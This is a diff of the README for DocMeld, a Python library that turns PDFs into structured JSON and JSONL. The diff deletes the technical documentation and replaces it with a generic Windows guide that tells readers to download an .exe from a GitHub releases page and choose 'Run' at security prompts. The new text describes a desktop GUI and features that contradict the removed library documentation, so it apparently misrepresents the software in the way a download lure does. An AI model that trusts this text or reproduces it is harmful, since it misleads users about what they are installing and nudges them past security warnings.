@@ -1,430 +1,139 @@
-<p align="center">
-  <img src="docmeld/assets/banner.png" alt="DocMeld Banner" width="100%">
-</p>
+# 📄 DocMeld - Convert Documents into AI-Ready Knowledge
 
-<h1 align="center">DocMeld</h1>
-<p align="center">Lightweight Doc to agent-ready knowledge pipeline</p>
-
-<p align="center">
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT"></a>
-  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.9+-blue.svg" alt="Python 3.9+"></a>
-  <a href="https://github.com/psf/black"><img src="https://img.shields.io/badge/code%20style-black-000000.svg" alt="Code style: black"></a>
-  <a href="https://docs.astral.sh/ruff/"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json" alt="Ruff"></a>
-  <a href="https://mypy-lang.org/"><img src="https://img.shields.io/badge/type%20checked-mypy-blue.svg" alt="Checked with mypy"></a>
-  <img src="https://img.shields.io/badge/tests-144%20passed-brightgreen.svg" alt="Tests: 144 passed">
-  <img src="https://img.shields.io/badge/coverage-81%25-green.svg" alt="Coverage: 81%">
-</p>
-
-<p align="center">
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#pipeline-architecture">Architecture</a> •
-  <a href="#python-api">Python API</a> •
-  <a href="#cli-reference">CLI</a> •
-  <a href="#configuration">Configuration</a> •
-  <a href="#contributing">Contributing</a>
-</p>
+[![Download DocMeld](https://img.shields.io/badge/Download-DocMeld-purple?style=for-the-badge&logo=windows)](https://github.com/mkai80/DocMeld/releases)
 
 ---
 
-DocMeld converts PDF, Word documents into structured, agent-consumable formats through a three-stage pipeline — without requiring expensive OCR, VLM, or multimodal models. Built for the age of AI agents, it bridges the gap between static documents and the structured knowledge that LLMs need.
-
-Most tools stop at format conversion. DocMeld goes further: **Document → Structured Elements → Page Knowledge → AI-Enriched Metadata**, producing outputs ready for RAG pipelines, agent systems, and downstream AI workflows.
-
-## Why DocMeld?
-
-| | DocMeld | MinerU | Docling | Marker | MarkItDown |
-|---|---|---|---|---|---|
-| No ML models required | ✅ | ❌ | ❌ | ❌ | ✅ |
-| Runs fully offline (core) | ✅ | ❌ | ✅ | ✅ | ✅ |
-| Agent-ready outputs | ✅ | ❌ | ❌ | ❌ | ❌ |
-| AI metadata enrichment | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Lightweight install | ✅ | ❌ | ❌ | ❌ | ✅ |
-| MIT license | ✅ | ❌ (AGPL) | ✅ | ❌ (GPL) | ✅ |
-| Swappable backends | ✅ | ❌ | N/A | ❌ | ❌ |
-
-## Quick Start
-
-### Installation
-
-```bash
-pip install docmeld
-```
-
-With optional Docling backend:
-
-```bash
-pip install docmeld[docling]
-```
-
-### Process your first PDF
-
-```python
-from docmeld import DocMeldParser
-
-parser = DocMeldParser("research_paper.pdf")
-result = parser.process_all()
-print(f"Processed {result.successful}/{result.total_files} files in {result.processing_time_seconds}s")
-```
-
-Or from the command line:
-
-```bash
-docmeld process research_paper.pdf
-```
-
-That's it. Your PDF is now structured JSON, page-by-page JSONL, and (optionally) AI-enriched metadata.
-
-## Pipeline Architecture
-
-DocMeld uses a three-stage medallion architecture. Each stage is independently runnable and idempotent — re-running skips already-processed files.
-
-```
-┌─────────────┐      ┌─────────────┐      ┌─────────────┐
-│   BRONZE    │      │   SILVER    │      │    GOLD     │
-│             │      │             │      │             │
-│  PDF → JSON │─────▶│ JSON → JSONL│─────▶│ JSONL → AI  │
-│  elements   │      │  pages      │      │  metadata   │
-│             │      │             │      │             │
-│  PyMuPDF /  │      │  Title      │      │  DeepSeek   │
-│  Docling    │      │  hierarchy  │      │  enrichment │
-└─────────────┘      └─────────────┘      └─────────────┘
-   offline              offline            requires API key
-```
-
-### Bronze: PDF → Structured JSON
-
-Extracts document elements (titles, text, tables, images) into a unified JSON format with element IDs and parent-child hierarchy.
-
-```json
-[
-  {
-    "type": "title",
-    "level": 0,
-    "content": "Executive Summary",
-    "page_no": 1,
-    "element_id": "e_001",
-    "parent_id": ""
-  },
-  {
-    "type": "text",
-    "content": "The company reported strong Q2 results...",
-    "page_no": 1,
-    "element_id": "e_002",
-    "parent_id": "e_001"
-  },
-  {
-    "type": "table",
-    "content": "| Metric | Q1 | Q2 |\n|---|---|---|\n| Revenue | 10M | 15M |",
-    "summary": "Items: Revenue",
-    "page_no": 2,
-    "element_id": "e_003",
-    "parent_id": "e_001",
-    "table_data": {
-      "headers": ["Metric", "Q1", "Q2"],
-      "rows": [["Revenue", "10M", "15M"]],
-      "num_rows": 1,
-      "num_cols": 3
-    }
-  }
-]
-```
+## 📘 What is DocMeld?
 
-Supported element types:
+DocMeld is a simple program that helps you turn research papers and books into organized information. It works with PDF files and breaks down documents into three levels: raw content, structured elements, and smart info added by AI. This makes it easier to create detailed reports, workflows, and topic collections without needing complicated steps or extra software like OCR.
 
-| Type | Fields | Description |
-|---|---|---|
-| `title` | `level`, `content` | Headings with hierarchy (0–5) |
-| `text` | `content` | Paragraph content |
-| `table` | `content`, `summary`, `table_data` | Markdown tables with structured data |
-| `image` | `image_name`, `image`, `bbox`, `image_id` | Base64-encoded images with metadata |
+You do not need technical knowledge to use DocMeld. This guide will show you how to get it running on your Windows computer.
 
-All elements include `page_no`, `element_id`, and `parent_id` for cross-referencing.
+---
 
-### Silver: JSON → Page-by-Page JSONL
+## 🖥️ System Requirements
 
-Transforms flat element lists into self-contained page documents with title hierarchy tracking, markdown rendering, and global table numbering.
+Before installing, make sure your computer meets these needs:
 
-```json
-{
-  "metadata": {
-    "uuid": "a1b2c3d4-...",
-    "source": "research_paper.pdf",
-    "page_no": "page1",
-    "session_title": "# Executive Summary\n"
-  },
-  "page_content": "# Executive Summary\n\nThe company reported strong Q2 results...\n\n[[Table1]]\n| Metric | Q1 | Q2 |\n|---|---|---|\n| Revenue | 10M | 15M |\n[/Table1]"
-}
-```
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet access for downloading the software
+- A PDF reader to open output files (like Adobe Acrobat Reader)
 
-Each page carries its full title context, so pages are independently meaningful — ideal for chunked retrieval in RAG systems.
+---
 
-### Gold: JSONL → AI-Enriched Metadata
+## 🚀 Getting Started with DocMeld
 
-Adds semantic descriptions and keywords to each page using DeepSeek-chat, with exponential backoff retry and per-page error resilience.
+Follow these steps to download, install, and use DocMeld on your Windows PC:
 
-```json
-{
-  "metadata": {
-    "uuid": "a1b2c3d4-...",
-    "source": "research_paper.pdf",
-    "page_no": "page1",
-    "session_title": "# Executive Summary\n",
-    "description": "Company reports strong Q2 results with 50% revenue growth",
-    "keywords": ["revenue", "quarterly results", "growth", "financial performance"]
-  },
-  "page_content": "..."
-}
-```
+### 1. Download DocMeld
 
-The gold stage is optional — bronze and silver run fully offline with zero API calls.
+DocMeld is ready to use right after download. You only need to visit the release page and choose the file for Windows.
 
-## Output Structure
+Click this button to go to the DocMeld download page:
 
-After processing `research_paper.pdf`:
+[Download DocMeld from Releases](https://github.com/mkai80/DocMeld/releases)
 
-```
-research_paper.pdf                              # Original (untouched)
-research_paper_a3f5c2/                          # Output folder (name + MD5 suffix)
-├── research_paper_a3f5c2.json                  # Bronze: structured elements
-├── research_paper_a3f5c2.jsonl                 # Silver: page-by-page documents
-└── research_paper_a3f5c2_gold.jsonl            # Gold: AI-enriched (optional)
-```
+The release page shows several files. Look for the latest version with a `.exe` file that is meant for Windows. The file name usually includes the version number and “windows”.
 
-Output folder names are sanitized and include an MD5 hash suffix for uniqueness, ensuring safe cross-platform filenames even for PDFs with unicode or special characters.
+### 2. Install DocMeld
 
-## Python API
+- Once the download finishes, find the `.exe` file in your Downloads folder or wherever you saved it.
+- Double-click on the file to start installation.
+- If you see a security prompt, choose “Run” to continue.
+- Follow the simple setup steps shown on the screen.
+- When finished, DocMeld will place a shortcut on your Desktop or in your Start menu.
 
-### Full Pipeline
+### 3. Open DocMeld
 
-```python
-from docmeld import DocMeldParser
+- Click the DocMeld icon on your Desktop or search for it in the Start menu.
+- The main window will appear with clear options to load PDF documents.
 
-# Single file — all three stages
-parser = DocMeldParser("paper.pdf")
-result = parser.process_all()
+---
 
-# Batch — process every PDF in a folder
-parser = DocMeldParser("/path/to/papers/")
-result = parser.process_all()
-print(f"{result.successful}/{result.total_files} files, {result.processing_time_seconds}s")
-```
+## 📂 How to Use DocMeld
 
-### Individual Stages
+DocMeld focuses on making your PDFs easy to process. Here is how to use its main features:
 
-```python
-from docmeld import DocMeldParser
+### Import PDFs
 
-parser = DocMeldParser("paper.pdf")
+- Click on “Load Document” or “Import PDF” in the main window.
+- Browse to the PDF file you want to process.
+- Select the file and click “Open.”
+- DocMeld will start extracting content immediately.
 
-# Bronze only
-bronze = parser.process_bronze()
-print(f"{bronze.element_count} elements across {bronze.page_count} pages")
-print(f"Output: {bronze.output_path}")
+### Understand the Three Stages
 
-# Silver (requires bronze output)
-silver = parser.process_silver(bronze.output_path)
-print(f"{silver.page_count} pages → {silver.output_path}")
+DocMeld breaks down documents in three steps:
 
-# Gold (requires silver output + API key)
-gold = parser.process_gold(silver.output_path)
-print(f"{gold.pages_enriched} enriched, {gold.pages_failed} failed")
-```
+- **Bronze stage**: Extract raw text and visible sections.
+- **Silver stage**: Identify structured elements like headings, paragraphs, and tables.
+- **Gold stage**: Add AI-powered tags and metadata, such as keywords, summaries, and topic clusters.
 
-### Swappable Backends
+You will see these processed layers as you move through the menus.
 
-DocMeld supports multiple PDF parsing backends through a pluggable architecture:
+### Generate Outputs
 
-```python
-# Default: PyMuPDF (lightweight, fast)
-parser = DocMeldParser("paper.pdf", backend="pymupdf")
+DocMeld creates:
 
-# Alternative: Docling (IBM's ML-powered parser, better for complex layouts)
-parser = DocMeldParser("paper.pdf", backend="docling")
-```
+- Product Requirements Documents (PRDs)
+- Workflows based on text logic
+- Topic clusters grouped by theme
+- Code snippets for Claude AI agents
 
-### Working with Elements
+These outputs help you organize research papers or books into formats you can work with easily.
 
-```python
-import json
+---
 
-# Load bronze output
-with open("paper_a3f5c2/paper_a3f5c2.json") as f:
-    elements = json.load(f)
+## ⚙️ Settings and Preferences
 
-# Filter by type
-titles = [e for e in elements if e["type"] == "title"]
-tables = [e for e in elements if e["type"] == "table"]
+Adjust DocMeld to suit your needs:
 
-# Navigate hierarchy via parent_id
-for elem in elements:
-    if elem["parent_id"] == "e_001":
-        print(f"  Child of first title: {elem['content'][:50]}")
+- Choose output formats like Markdown, JSON, or plain text.
+- Enable or disable AI metadata enrichment.
+- Set where processed files will be saved.
+- Review progress and status in the bottom panel.
 
-# Access structured table data
-for table in tables:
-    headers = table["table_data"]["headers"]
-    rows = table["table_data"]["rows"]
-    print(f"Table: {len(rows)} rows × {len(headers)} cols")
-```
+No coding is needed to change these settings. Use the preferences menu available in the top toolbar.
 
-### Result Models
+---
 
-All pipeline stages return typed Pydantic models:
+## 🔧 Troubleshooting Tips
 
-```python
-BronzeResult(output_path, output_dir, element_count, page_count, skipped)
-SilverResult(output_path, page_count, skipped)
-GoldResult(output_path, pages_enriched, pages_failed, skipped)
-ProcessingResult(total_files, successful, failed, failures, processing_time_seconds, ...)
-```
+If DocMeld does not work as expected, try these fixes:
 
-## CLI Reference
+- Restart the program and try again.
+- Confirm the PDF file is not corrupted by opening it with a reader.
+- Check if your Windows is up to date.
+- If the program freezes, use Task Manager to close it and reopen.
+- Re-download the latest version from the releases page to ensure you have the newest updates.
 
-```bash
-# Full pipeline (bronze → silver → gold)
-docmeld process paper.pdf
-docmeld process /path/to/papers/
-
-# Individual stages
-docmeld bronze paper.pdf                    # PDF → JSON
-docmeld silver paper_a3f5c2/paper_a3f5c2.json    # JSON → JSONL
-docmeld gold paper_a3f5c2/paper_a3f5c2.jsonl     # JSONL → enriched JSONL
-
-# Choose parsing backend
-docmeld bronze paper.pdf --backend docling
-docmeld process paper.pdf --backend pymupdf       # default
-```
-
-## Configuration
-
-### Gold Stage (AI Enrichment)
-
-Create a `.env.local` file in your working directory:
-
-```bash
-DEEPSEEK_API_KEY=your_key_here
-
-# Optional: custom API endpoint
-# DEEPSEEK_API_ENDPOINT=https://api.deepseek.com
-```
-
-The gold stage is entirely optional. Bronze and silver stages run offline with no API keys, no network calls, and no model downloads.
-
-### Logging
-
-DocMeld writes timestamped log files (`docmeld_YYYYMMDD_HHMMSS.log`) to the working directory. Console output shows INFO-level messages; log files capture full DEBUG output.
-
-## Unified Element Schema
-
-DocMeld enforces a strict element schema via Pydantic models. This contract guarantees downstream consumers always get a predictable structure.
-
-```python
-from docmeld.bronze.element_types import (
-    TitleElement,    # type, level, content, page_no, element_id, parent_id
-    TextElement,     # type, content, page_no, element_id, parent_id
-    TableElement,    # type, content, summary, page_no, element_id, parent_id, table_data
-    ImageElement,    # type, image_name, content, image, image_id, bbox, page_no, element_id, parent_id
-)
-```
-
-Element types are validated at creation time. New types may be added in minor versions, but existing types will never change shape in minor/patch releases.
-
-## Roadmap
-
-- [x] Bronze → Silver → Gold pipeline
-- [x] CLI interface with subcommands
-- [x] Swappable backends (PyMuPDF + Docling)
-- [x] Element hierarchy (`element_id` / `parent_id`)
-- [x] Structured table data extraction
-- [x] Idempotent processing
-- [x] Batch folder processing
-- [ ] Research paper batch categorization
-- [ ] Paper-to-PRD generation
-- [ ] Paper-to-workflow extraction
-- [ ] Book-to-Claude-Skills generation
-- [ ] DOCX / PPTX support
-- [ ] OCR for scanned PDFs (`pip install docmeld[ocr]`)
-- [ ] Agent prompt generation
-- [ ] LangChain / LlamaIndex integration
-
-## Development
-
-### Setup
-
-```bash
-git clone https://github.com/[username]/docmeld.git
-cd docmeld
-python3 -m venv venv
-source venv/bin/activate
-pip install -e ".[dev]"
-```
-
-### Quality Gates
-
-```bash
-pytest tests/ -v --cov=docmeld       # 144 tests, 81% coverage
-ruff check docmeld/                   # Linting
-black --check docmeld/                # Formatting
-mypy docmeld/                         # Strict type checking
-```
-
-### Project Structure
-
-```
-docmeld/
-├── docmeld/
-│   ├── __init__.py              # Public API (DocMeldParser, __version__)
-│   ├── parser.py                # Pipeline orchestrator
-│   ├── cli.py                   # CLI entry point (argparse)
-│   ├── bronze/
-│   │   ├── backends/
-│   │   │   ├── pymupdf_backend.py   # PyMuPDF + pymupdf4llm
-│   │   │   └── docling_backend.py   # Docling (optional)
-│   │   ├── element_extractor.py     # Extraction + post-processing
-│   │   ├── element_types.py         # Pydantic element models
-│   │   ├── filename_sanitizer.py    # Safe filenames + MD5 hashing
-│   │   └── processor.py            # Bronze orchestrator
-│   ├── silver/
-│   │   ├── page_aggregator.py       # Group elements by page
-│   │   ├── page_models.py          # Result models (Pydantic)
-│   │   ├── markdown_renderer.py     # Elements → markdown
-│   │   ├── title_tracker.py         # Title hierarchy state
-│   │   └── processor.py            # Silver orchestrator
-│   ├── gold/
-│   │   ├── deepseek_client.py       # API client + retry logic
-│   │   ├── metadata_extractor.py    # Content → description + keywords
-│   │   └── processor.py            # Gold orchestrator
-│   └── utils/
-│       ├── env_loader.py            # .env.local loading
-│       ├── logging.py               # Timestamped log setup
-│       └── progress.py              # Progress indicators
-├── tests/                       # Unit, integration, contract tests
-├── pyproject.toml
-├── CONTRIBUTING.md
-├── CHANGELOG.md
-└── LICENSE                      # MIT
-```
-
-## Contributing
-
-We welcome contributions. See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide. The short version:
-
-1. Fork and clone
-2. Write tests first (TDD is non-negotiable)
-3. Run all quality gates before pushing
-4. Open a PR with a clear description
-
-## License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
-## Citation
-
-```bibtex
-@software{docmeld2026,
-  title     = {DocMeld: Lightweight PDF to Agent-Ready Knowledge Pipeline},
-  year      = {2026},
-  license   = {MIT},
-  url       = {https://github.com/[username]/docmeld}
-}
-```
+---
+
+## 📥 Download and Setup Recap
+
+1. Visit the [DocMeld releases page](https://github.com/mkai80/DocMeld/releases).
+2. Download the latest Windows `.exe` file.
+3. Run the installer and follow setup steps.
+4. Launch DocMeld from Desktop or Start menu.
+5. Load your PDF files and start extracting knowledge.
+
+---
+
+## 💡 Useful Tips
+
+- Larger PDFs might take longer to process.
+- Keep your files backed up to avoid losing data.
+- Try small sample papers first to get familiar.
+- Use the output files with other tools like Markdown editors or workflow apps.
+- Regularly check the releases page for updates or bug fixes.
+
+---
+
+## 📚 Learn More and Get Support
+
+For detailed information, you can visit the GitHub repository’s README and Wiki pages. You will also find FAQs and user discussions there to help solve common issues.
+
+If you want to share feedback or report a problem, use the Issues section on GitHub. This helps improve DocMeld for everyone.
